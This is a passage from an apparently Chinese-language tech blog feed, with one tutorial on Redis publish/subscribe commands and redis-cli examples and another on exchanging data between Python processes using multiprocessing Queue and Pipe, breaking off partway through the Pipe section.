        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="订阅发布"><a href="#订阅发布" class="headerlink" title="订阅发布"></a>订阅发布</h2><blockquote><p><code>pub/sub</code> 指的是<code>pulish</code> 发布与<code>subscribe</code> 订阅.在<code>redis</code> 中,他是一种消息通信模式:发送者<code>pub</code> 消息,订阅者<code>sub</code> 接受消息.<code>redis</code> 的客户端可以订阅任意数量的频道.</p><p>这个功能最明显的用法就是构建实时消息系统,比如普通的即时聊天,群聊等功能.还可以用在门户网站,当编辑更新了某推荐板块的内容后,<code>CMS</code> 发布清除缓存的消息到<code>channel</code> (发送者<code>pub</code> 消息),门户网站的缓存系统通过<code>channel</code> 接收到消息(订阅者<code>sub</code> 消息)后,更新推荐板块的缓存.</p></blockquote><h3 id="1-框架"><a href="#1-框架" class="headerlink" title="1.框架"></a>1.框架</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-16/1602857744498-pubsub1.png"></p><p>当有像消息<code>publish</code>到频道<code>channel1</code>时,这个消息就会发送给订阅它的客户端.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-16/1602857765265-pubsub2.png"></p></blockquote><h3 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2.常用命令"></a>2.常用命令</h3><blockquote><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>psubscribe pattern [pattern]</code></td><td>订阅一个或多个符合给定模式的频道</td></tr><tr><td><code>pubsub &lt;subcommand&gt; [argument [argument]]</code></td><td>查看订阅与发布系统状态</td></tr><tr><td><code>publish channel message</code></td><td>将消息发送给指定的频道</td></tr><tr><td><code>punsubscribe [pattern [pattern]]</code></td><td>退订所有给定模式的频道</td></tr><tr><td><code>subscribe channel [channel]</code></td><td>订阅给定的一个或多个频道的信息</td></tr><tr><td><code>unsubscribe channel [channel]</code></td><td>退订给定的频道</td></tr></tbody></table></blockquote><h3 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h3><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">############################ 订阅模式 ##############</span><span class="token comment" spellcheck="true"># psubscribe pattern [pattern] 订阅一个或多个符合给定模式的频道</span><span class="token comment" spellcheck="true"># 每个模式以 * 作为匹配符,比如 it.* 匹配所有的以 it 开头的频道 (it.news,it.blog 等)</span><span class="token comment" spellcheck="true"># 以下有2个发送消息redis-cli客户端</span><span class="token comment" spellcheck="true"># 订阅客户端</span>client1:6379<span class="token operator">></span> psubscribe new.* Reading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"psubscribe"</span>           <span class="token comment" spellcheck="true"># 返回值的类型:表示订阅成功</span>2<span class="token punctuation">)</span> <span class="token string">"new.*"</span>                       <span class="token comment" spellcheck="true"># 订阅的模式</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1                    <span class="token comment" spellcheck="true"># 订阅模式的数量</span><span class="token comment" spellcheck="true"># 发送客户端1</span>send1:6379<span class="token operator">></span> publish new.test1 <span class="token string">"from new.test1"</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1<span class="token comment" spellcheck="true"># 发送客户端2</span>send2:6379<span class="token operator">></span> publish new.test2 <span class="token string">'from test2'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1<span class="token comment" spellcheck="true"># 订阅客户端</span>127.0.0.1:6379<span class="token operator">></span> psubscribe new.* Reading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"psubscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"new.*"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 11<span class="token punctuation">)</span> <span class="token string">"pmessage"</span>                    <span class="token comment" spellcheck="true"># 返回值的类型</span>2<span class="token punctuation">)</span> <span class="token string">"new.*"</span>                              <span class="token comment" spellcheck="true"># 信息匹配的模式</span>3<span class="token punctuation">)</span> <span class="token string">"new.test1"</span>                      <span class="token comment" spellcheck="true"># 信息本身的目标频道</span>4<span class="token punctuation">)</span> <span class="token string">"from new.test1"</span>            <span class="token comment" spellcheck="true"># 信息的内容</span>1<span class="token punctuation">)</span> <span class="token string">"pmessage"</span>2<span class="token punctuation">)</span> <span class="token string">"new.*"</span>3<span class="token punctuation">)</span> <span class="token string">"new.test2"</span>4<span class="token punctuation">)</span> <span class="token string">"from test2"</span><span class="token comment" spellcheck="true">#################### 查看状态 ###################</span><span class="token comment" spellcheck="true"># client-1 订阅 news.it 和 news.sport 两个频道</span>client-1<span class="token operator">></span> SUBSCRIBE news.it news.sportReading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"subscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.it"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 11<span class="token punctuation">)</span> <span class="token string">"subscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.sport"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2<span class="token comment" spellcheck="true"># client-2 订阅 news.it 和 news.internet 两个频道</span>client-2<span class="token operator">></span> SUBSCRIBE news.it news.internetReading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"subscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.it"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 11<span class="token punctuation">)</span> <span class="token string">"subscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.internet"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2<span class="token comment" spellcheck="true"># 首先， client-3 打印所有活跃频道</span><span class="token comment" spellcheck="true"># 注意，即使一个频道有多个订阅者，它也只输出一次，比如 news.it</span>client-3<span class="token operator">></span> PUBSUB CHANNELS1<span class="token punctuation">)</span> <span class="token string">"news.sport"</span>2<span class="token punctuation">)</span> <span class="token string">"news.internet"</span>3<span class="token punctuation">)</span> <span class="token string">"news.it"</span><span class="token comment" spellcheck="true"># 接下来， client-3 打印那些与模式 news.i* 相匹配的活跃频道</span><span class="token comment" spellcheck="true"># 因为 news.sport 不匹配 news.i* ，所以它没有被打印</span>redis<span class="token operator">></span> PUBSUB CHANNELS news.i*1<span class="token punctuation">)</span> <span class="token string">"news.internet"</span>2<span class="token punctuation">)</span> <span class="token string">"news.it"</span><span class="token comment" spellcheck="true"># client-1 订阅 news.it 和 news.sport 两个频道</span>client-1<span class="token operator">></span> SUBSCRIBE news.it news.sportReading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"subscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.it"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 11<span class="token punctuation">)</span> <span class="token string">"subscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.sport"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2<span class="token comment" spellcheck="true"># client-2 订阅 news.it 和 news.internet 两个频道</span>client-2<span class="token operator">></span> SUBSCRIBE news.it news.internetReading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"subscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.it"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 11<span class="token punctuation">)</span> <span class="token string">"subscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.internet"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2<span class="token comment" spellcheck="true"># client-3 打印各个频道的订阅者数量</span>client-3<span class="token operator">></span> PUBSUB NUMSUB news.it news.internet news.sport news.music1<span class="token punctuation">)</span> <span class="token string">"news.it"</span>    <span class="token comment" spellcheck="true"># 频道</span>2<span class="token punctuation">)</span> <span class="token string">"2"</span>          <span class="token comment" spellcheck="true"># 订阅该频道的客户端数量</span>3<span class="token punctuation">)</span> <span class="token string">"news.internet"</span>4<span class="token punctuation">)</span> <span class="token string">"1"</span>5<span class="token punctuation">)</span> <span class="token string">"news.sport"</span>6<span class="token punctuation">)</span> <span class="token string">"1"</span>7<span class="token punctuation">)</span> <span class="token string">"news.music"</span> <span class="token comment" spellcheck="true"># 没有任何订阅者</span>8<span class="token punctuation">)</span> <span class="token string">"0"</span><span class="token comment" spellcheck="true"># client-1 订阅 news.* 和 discount.* 两个模式</span>client-1<span class="token operator">></span> PSUBSCRIBE news.* discount.*Reading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"psubscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.*"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 11<span class="token punctuation">)</span> <span class="token string">"psubscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"discount.*"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2<span class="token comment" spellcheck="true"># client-2 订阅 tweet.* 一个模式</span>client-2<span class="token operator">></span> PSUBSCRIBE tweet.*Reading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"psubscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"tweet.*"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1<span class="token comment" spellcheck="true"># client-3 返回当前订阅模式的数量为 3</span>client-3<span class="token operator">></span> PUBSUB NUMPAT<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3<span class="token comment" spellcheck="true"># 注意，当有多个客户端订阅相同的模式时，相同的订阅也被计算在 PUBSUB NUMPAT 之内</span><span class="token comment" spellcheck="true"># 比如说，再新建一个客户端 client-4 ，让它也订阅 news.* 频道</span>client-4<span class="token operator">></span> PSUBSCRIBE news.*Reading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>1<span class="token punctuation">)</span> <span class="token string">"psubscribe"</span>2<span class="token punctuation">)</span> <span class="token string">"news.*"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1<span class="token comment" spellcheck="true"># 这时再计算被订阅模式的数量，就会得到数量为 4</span>client-3<span class="token operator">></span> PUBSUB NUMPAT<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 4<span class="token comment" spellcheck="true">################## 退订 ################</span><span class="token comment" spellcheck="true"># PUNSUBSCRIBE [pattern [pattern ...]]</span><span class="token comment" spellcheck="true"># 如果没有模式被指定，也即是，一个无参数的 PUNSUBSCRIBE 调用被执行，那么客户端使用 PSUBSCRIBE 命令订阅的所有模式都会被退订。在这种情况下，命令会返回一个信息，告知客户端所有被退订的模式。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程使用queue交换对象</title>
      <link href="/posts/42103.html"/>
      <url>/posts/42103.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="进程之间交换对象"><a href="#进程之间交换对象" class="headerlink" title="进程之间交换对象"></a>进程之间交换对象</h2><blockquote><p>并行:同一时刻有多条指令在多个CPU上运行.</p><p>并行时常常需要进程之间交换数据,<code>multiprocessing</code> 模块提供了2个<code>communication channels</code> 来交换数据:队列<code>queue</code> 和管道<code>pipe</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-15/1602771182761-communication-channel.png"></p><p>除了上面两种交换数据的方式之外,进程之间也可以使用同步原语进行数据交换,但是要尽可能的避免使用同步原语,例如锁.因为<code>queue</code>和<code>pipe</code>效率上更高,更加安全.</p></blockquote><h3 id="1-使用队列queue-来交换数据"><a href="#1-使用队列queue-来交换数据" class="headerlink" title="1.使用队列queue 来交换数据"></a>1.使用队列<code>queue</code> 来交换数据</h3><blockquote><p><code>queue</code> 是多进程安全的队列,可以使用<code>queue</code> 来实现多进程之间的数据传递.</p><ul><li><code>put</code> :此方法用来插入数据队列中,可选参数有两个:<code>blocked\timeout</code><ul><li>如果<code>blocked=True</code>(默认值),并且<code>timeout</code> 为正数,该方法会阻塞<code>timeout</code> 指定时间.直到该队列有剩余的空间.如果超时,会抛出<code>Queue.Full</code>异常</li><li>如果<code>blocked=False</code>,但是该队列已满,会抛出<code>Queue.Full</code>异常</li></ul></li><li><code>get</code> :此方法可以从队列读取并删除一个元素.可选参数有2个:<code>blocked\timeout</code><ul><li>如果<code>blocked=True</code>(默认值),并且<code>timeout</code> 为正数,那么在等待时间内没有取到任何元素,会抛出<code>Queue.Empty</code>异常</li><li>如果<code>blocked=False</code>,如果<code>queue</code> 有一个值可用,立即返回该值,否则,队列为空,会立即抛出异常<code>Queue.Empty</code></li></ul></li></ul><p>常用属性和方法:</p><table><thead><tr><th><code>qsize()</code></th><th>返回队列的大小</th></tr></thead><tbody><tr><td><code>empty()</code></td><td>返回布尔值,队列是否为空</td></tr><tr><td><code>full()</code></td><td>返回布尔值,队列是否满了</td></tr><tr><td><code>put(item[,block[,timeout]])</code></td><td>在队列中添加元素<code>item</code></td></tr><tr><td><code>put_nowait(item)</code></td><td>等价与<code>put(item, False)</code></td></tr><tr><td><code>get(item[,block[,timeout]])</code></td><td>在队列中删除元素并返回该元素的值</td></tr><tr><td><code>get_nowait()</code></td><td>等价与<code>get(Flase)</code></td></tr><tr><td>close()</td><td>表示该<code>queue</code> 不加入新元素</td></tr><tr><td><code>join_theread()</code></td><td>加入后台线程,只能在调用<code>close()</code> 后使用.它阻塞直到后台线程退出,确保缓冲区所有数据已经刷新到管道.默认情况下,如果进程不是队列的创建者,则退出.它将尝试加入队列的后台线程.</td></tr><tr><td><code>cancle_join_thread()</code></td><td>终止<code>join_thread()</code>防止后台线程在进程退出时被自动连接,可能会导致数据丢失</td></tr></tbody></table></blockquote><h4 id="队列实例"><a href="#队列实例" class="headerlink" title="队列实例"></a>队列实例</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token punctuation">,</span>os<span class="token punctuation">,</span>random<span class="token triple-quoted-string string">"""queue队列在队列中,进程是相互独立的.数据的交互,可以使用队列一个写入,一个读取"""</span><span class="token keyword">def</span> <span class="token function">write_process</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'put {} to queue ...'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_process</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> <span class="token operator">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      value <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'get {} from queue...'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""主进程"""</span><span class="token comment" spellcheck="true"># 使用主进程创建队列</span>main_process_queue <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建子进程</span>write_process_child <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>write_process<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>main_process_queue<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>read_process_child <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>read_process<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>main_process_queue<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 启动并阻塞</span>write_process_child<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>write_process_child<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>read_process_child<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>read_process_child<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">put A to queue<span class="token punctuation">..</span><span class="token punctuation">..</span>put B to queue<span class="token punctuation">..</span><span class="token punctuation">..</span>put C to queue<span class="token punctuation">..</span><span class="token punctuation">..</span>put D to queue<span class="token punctuation">..</span><span class="token punctuation">..</span>Get A from queueGet B from queueGet C from queueGet D from queue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="生产者-消费者模式"><a href="#生产者-消费者模式" class="headerlink" title="生产者/消费者模式"></a>生产者/消费者模式</h4><blockquote><p>以上就类似于生产者/消费者模式</p><p>它包含两类进程:一种只是用来生产数据,例外一种只是用来消费数据.为了串联他们,通常会采用共享的数据区域,就像一个仓库.生产者产生的数据都放入仓库中并不需要关注消费者的行为,消费者只需要从共享仓库中获取数据,并不需要关心生产者的行为.</p><p>而作为仓库关注的行为是:</p><ul><li>如果仓库共享数据区域已满的状态</li><li>如果共享数据区域已空的状态</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>os<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token comment" spellcheck="true"># 定义生产者</span><span class="token keyword">class</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue        super<span class="token punctuation">(</span>Producer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            item <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 添加到队列</span>            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>item<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'生产者进程:{},添加{}到Queue队列中...'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'队列大小:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义消费者</span><span class="token keyword">class</span> <span class="token class-name">Cunsumer</span><span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue        super<span class="token punctuation">(</span>Cunsumer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'队列非空'</span><span class="token punctuation">)</span>                item <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'消费者进程:{},从队列中取出:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'队列为空,退出'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主进程"""</span>    queue <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    producer <span class="token operator">=</span> Producer<span class="token punctuation">(</span>queue<span class="token punctuation">)</span>    cunsumer <span class="token operator">=</span> Cunsumer<span class="token punctuation">(</span>queue<span class="token punctuation">)</span>    producer<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    producer<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    cunsumer<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    cunsumer<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-bash"><code class="language-bash">生产者进程:Producer-1,添加227到Queue队列中<span class="token punctuation">..</span>.队列大小:1生产者进程:Producer-1,添加114到Queue队列中<span class="token punctuation">..</span>.队列大小:2生产者进程:Producer-1,添加252到Queue队列中<span class="token punctuation">..</span>.队列大小:3队列非空消费者进程:Cunsumer-2,从队列中取出:227队列非空消费者进程:Cunsumer-2,从队列中取出:114队列非空消费者进程:Cunsumer-2,从队列中取出:252队列为空,退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Queue</code> 在其中扮演了一个仓库的角色,就是用来处理共享数据的</p></blockquote><h3 id="2-使用pipe-管道"><a href="#2-使用pipe-管道" class="headerlink" title="2.使用pipe 管道"></a>2.使用<code>pipe</code> 管道</h3><blockquote><p><code>Pipe</code> 不是类,是函数,该函数定义在<code>multiprocessing\connection.py</code> 中,返回一对通过管道连接的对象<code>con1</code>和<code>con2</code>,函数的原型是<code>Pipe()duplex=True</code></p><ul><li><code>dublex=True</code>(默认值):管道是双向的,处于全双工模式,<code>con1\con2</code> 都可以收发数据</li><li><code>dublex=False</code> ,管道是单向的,<code>con1</code> 只能用于发送,<code>con2</code> 只能用于接受</li></ul><pre class="line-numbers language-python">con1, con2 = multiprocessing.Pipe([duplex])</code></pre><p><code>Pipe()</code> 返回的是管道的两端,两端每个对象都有<code>send()</code>和<code>recv()</code> 方法(还有其他方法),例如在全双工模式下,可以用<code>con1.send()</code> 发送消息,<code>con2.recv()</code>接受消息,如果没有消息可以接受,<code>recv()</code>方法会一直阻塞,如果管道已经关闭,<code>recv()</code> 会抛出<code>EOFError</code> 